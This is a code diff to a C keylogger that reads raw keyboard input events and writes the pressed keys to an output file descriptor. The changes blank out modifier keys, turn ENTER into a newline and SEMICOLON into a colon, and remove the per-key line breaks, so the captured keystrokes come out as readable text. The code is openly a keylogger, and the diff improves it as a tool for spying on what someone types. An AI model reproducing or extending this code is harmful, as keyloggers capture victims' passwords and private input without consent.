@@ -36,9 +36,9 @@ const char *keycodes[] = {
     "I",
     "O",
     "P",
-    "LEFTBRACE",
-    "RIGHTBRACE",
-    "ENTER",
+    "",//"LEFTBRACE",
+    "",//RIGHTBRACE",
+    "\n",
     "LEFTCTRL",
     "A",
     "S",
@@ -49,10 +49,10 @@ const char *keycodes[] = {
     "J",
     "K",
     "L",
-    "SEMICOLON",
+    ":",
     "APOSTROPHE",
     "GRAVE",
-    "LEFTSHIFT",
+    "",//"LEFTSHIFT",
     "BACKSLASH",
     "Z",
     "X",
@@ -64,11 +64,11 @@ const char *keycodes[] = {
     "COMMA",
     "DOT",
     "SLASH",
-    "RIGHTSHIFT",
+    "",//"RIGHTSHIFT",
     "KPASTERISK",
     "LEFTALT",
     "SPACE",
-    "CAPSLOCK",
+    "",//"CAPSLOCK",
     "F1",
     "F2",
     "F3",
@@ -87,6 +87,7 @@ int loop = 1;
 
 void sigint_handler(int sig){
     loop = 0;
+    exit(0);
 }
 
 /**
@@ -151,7 +152,6 @@ void keylogger(int keyboard, int writeout){
                 if(events[i].value == 1){
                     if(events[i].code > 0 && events[i].code < NUM_KEYCODES){
                         safe_write_all(writeout, keycodes[events[i].code], keyboard);
-                        safe_write_all(writeout, "\n", keyboard);
                     }
                     else{
                         write(writeout, "UNRECOGNIZED", sizeof("UNRECOGNIZED"));
@@ -160,5 +160,4 @@ void keylogger(int keyboard, int writeout){
             }
         }
     }
-    if(bytesRead > 0) safe_write_all(writeout, "\n", keyboard);
 }
